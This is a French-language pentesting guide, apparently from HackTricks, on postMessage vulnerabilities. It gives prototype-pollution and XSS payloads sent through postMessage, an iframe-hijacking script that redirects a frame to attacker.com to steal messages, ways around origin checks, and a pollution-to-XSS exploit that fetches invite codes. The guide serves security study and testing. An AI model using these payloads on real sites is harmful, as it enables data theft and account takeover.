# Vuln√©rabilit√©s PostMessage

## Vuln√©rabilit√©s PostMessage

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Envoyer un **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut √™tre un '\*' ou une URL comme _https://company.com._\
Dans le **deuxi√®me sc√©nario**, le **message ne peut √™tre envoy√© qu'√† ce domaine** (m√™me si l'origine de l'objet fen√™tre est diff√©rente).\
Si le **joker** est utilis√©, les **messages pourraient √™tre envoy√©s √† n'importe quel domaine**, et seront envoy√©s √† l'origine de l'objet Window.

### Attaque de l'iframe et du joker dans **targetOrigin**

Comme expliqu√© dans [**ce rapport**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), si vous trouvez une page qui peut √™tre **ifram√©e** (sans protection `X-Frame-Header`) et qui envoie des messages **sensibles** via **postMessage** en utilisant un **joker** (\*), vous pouvez **modifier** l'**origine** de l'**iframe** et **fuir** le **message sensible** vers un domaine contr√¥l√© par vous.\
Notez que si la page peut √™tre ifram√©e mais que le **targetOrigin** est **d√©fini sur une URL et non sur un joker**, cette **astuce ne fonctionnera pas**.
```markup
<html>
   <iframe src="https://docs.google.com/document/ID" />
   <script>
      setTimeout(exp, 6000); //Wait 6s
      
      //Try to change the origin of the iframe each 100ms
      function exp(){
          setInterval(function(){ 
              window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
          }, 100);
      }
   </script>
```
## Exploitation de addEventListener

**`addEventListener`** est la fonction utilis√©e par JS pour d√©clarer la fonction qui **attend les `postMessages`**.\
Un code similaire √† celui-ci sera utilis√© :
```javascript
window.addEventListener("message", (event) => {
  if (event.origin !== "http://example.org:8080")
    return;

  // ...
}, false);
```
Notez dans ce cas comment la **premi√®re chose** que le code fait est de **v√©rifier l'origine**. C'est terriblement **important**, surtout si la page va faire **quelque chose de sensible** avec les informations re√ßues (comme changer un mot de passe). **Si elle ne v√©rifie pas l'origine, les attaquants peuvent faire en sorte que les victimes envoient des donn√©es arbitraires √† ces points d'extr√©mit√©** et changer les mots de passe des victimes (dans cet exemple).

### √ânum√©ration

Afin de **trouver des √©couteurs d'√©v√©nements** sur la page actuelle, vous pouvez :

* **Rechercher** le code JS pour `window.addEventListener` et `$(window).on` (version _JQuery_)
* **Ex√©cuter** dans la console des outils de d√©veloppement : `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Aller √†** _Elements --> Event Listeners_ dans les outils de d√©veloppement du navigateur

![](<../../.gitbook/assets/image (617).png>)

* Utilisez une **extension de navigateur** comme [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ces extensions de navigateur **intercepteront tous les messages** et vous les montreront.

### Bypass de base de v√©rification d'origine

* Si **`indexOf()`** est utilis√© pour **v√©rifier** l'**origine** de l'√©v√©nement PostMessage, rappelez-vous qu'il peut √™tre facilement contourn√© comme dans l'exemple suivant : `("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")`\\
* Si **`search()`** est utilis√© pour **valider** l'**origine**, cela peut √™tre ins√©curis√©. Selon la documentation de `String.prototype.search()`, la m√©thode **prend un objet d'expression r√©guli√®re** au lieu d'une cha√Æne. Si autre chose qu'une expression r√©guli√®re est pass√©, il sera implicitement converti en une expression r√©guli√®re.\
  Dans une expression r√©guli√®re, **un point (.) est trait√© comme un caract√®re g√©n√©rique**. Un attaquant peut en profiter et **utiliser** un **domaine sp√©cial** au lieu de celui officiel pour contourner la validation, comme dans : `"https://www.safedomain.com".search("www.s.fedomain.com")`.\\
* Si la fonction **`escapeHtml`** est utilis√©e, la fonction ne cr√©e pas un nouvel objet √©chapp√©, mais elle **√©crase les propri√©t√©s** de l'objet existant. Cela signifie que si nous sommes capables de cr√©er un objet avec une propri√©t√© contr√¥l√©e qui ne r√©pond pas √† `hasOwnProperty`, elle ne sera pas √©chapp√©e.
```javascript
// Expected to fail:
result = u({
  message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
L'objet `File` est parfait pour cette exploitation car il poss√®de une propri√©t√© en lecture seule `name` qui est utilis√©e par notre mod√®le et contournera la fonction `escapeHtml`.

### Contournement de e.origin == window.origin

Lorsqu'une page est int√©gr√©e dans une **iframe sandbox√©e** via `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`, l'**origine** de cette **iframe** sera **`null`**.

Lorsque la valeur de **sandbox `allow-popups` est d√©finie**, la **popup ouverte** **h√©ritera** de tous les **attributs sandbox√©s** sauf si `allow-popups-to-escape-sandbox` est d√©fini.\
Ainsi, l'ouverture d'une **popup** √† partir d'une **origine nulle** rendra √©galement **`window.origin`** √† l'int√©rieur de la popup **`null`**.

Par cons√©quent, si vous ouvrez une **iframe sandbox√©e** autorisant les popups, puis vous **ouvrez une popup** √† partir de l'int√©rieur de l'iframe, et **envoyez un message** de l'iframe **√† la popup**, les deux origines sont nulles, donc: **`e.origin == window.origin == null`**

Pour plus d'informations, **lisez**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contournement de e.source

Vous pouvez forcer **`e.source`** d'un message √† √™tre nul en cr√©ant une **iframe** qui **envoie** le **postMessage** et est **imm√©diatement supprim√©e**.

Pour plus d'informations, **lisez:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Contournement de l'en-t√™te X-Frame

Pour effectuer ces attaques, vous pourrez id√©alement **mettre la page web victime** √† l'int√©rieur d'un `iframe`. Mais certains en-t√™tes comme `X-Frame-Header` peuvent **emp√™cher** ce **comportement**.\
Dans ces sc√©narios, vous pouvez toujours utiliser une attaque moins furtive. Vous pouvez ouvrir un nouvel onglet vers l'application web vuln√©rable et communiquer avec elle:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Vol de message envoy√© √† un enfant en bloquant la page principale

Sur la page suivante, vous pouvez voir comment vous pourriez voler des donn√©es sensibles envoy√©es par **postmessage** √† un **iframe enfant** en **bloquant** la **page principale** avant d'envoyer les donn√©es et en exploitant un **XSS dans l'enfant** pour **fuir les donn√©es** avant qu'elles ne soient re√ßues :

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Vol de message en modifiant l'emplacement de l'iframe

Si vous pouvez inclure une page web sans en-t√™te X-Frame qui contient un autre iframe, vous pouvez **changer l'emplacement de cet iframe enfant**, donc si elle re√ßoit un **postmessage** envoy√© en utilisant un **joker**, un attaquant pourrait **changer** l'**origine** de cet iframe vers une page **contr√¥l√©e** par lui et **voler** le message :

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage vers la pollution de prototype et/ou XSS

Dans les sc√©narios o√π les donn√©es envoy√©es via `postMessage` sont ex√©cut√©es par JS, vous pouvez **inclure** la **page** et **exploiter** la **pollution de prototype/XSS** en envoyant l'exploit via `postMessage`.

Un couple de **XSS tr√®s bien expliqu√©s via `postMessage`** peuvent √™tre trouv√©s dans [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemple d'une exploitation pour abuser de la **pollution de prototype et ensuite XSS** via un `postMessage` √† un `iframe`:
```markup
<html>
<body>
    <iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
        function get_code() {
            document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
            document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
        }

        setTimeout(get_code, 2000);
    </script>
</body>
</html>
```
Pour **plus d'informations** :

* Lien vers la page sur la [**pollution de prototype**](../deserialization/nodejs-proto-prototype-pollution/)
* Lien vers la page sur le [**XSS**](../xss-cross-site-scripting/)
* Lien vers la page sur la [**pollution de prototype c√¥t√© client vers XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## R√©f√©rences

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pour pratiquer : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
